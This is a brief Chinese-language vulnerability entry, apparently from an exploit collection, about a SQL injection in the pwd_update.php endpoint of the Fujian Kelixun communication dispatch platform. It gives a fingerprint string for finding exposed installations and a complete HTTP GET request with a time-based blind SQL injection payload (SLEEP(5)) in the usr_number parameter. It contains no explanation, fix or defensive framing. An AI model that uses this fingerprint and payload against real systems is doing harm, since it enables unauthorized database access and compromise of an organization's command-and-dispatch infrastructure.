# 福建科立迅通信指挥调度平台pwd_update.phpSQL注入漏洞

福建科立迅通信指挥调度平台pwd_update.php ｜ SQL注入 ｜ —
- **指纹**：`body="app/structure/departments.php"`
- **请求**：`GET /api/client/user/pwd_update.php?usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(5)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1 HTTP/1.1`
- **响应特征**：200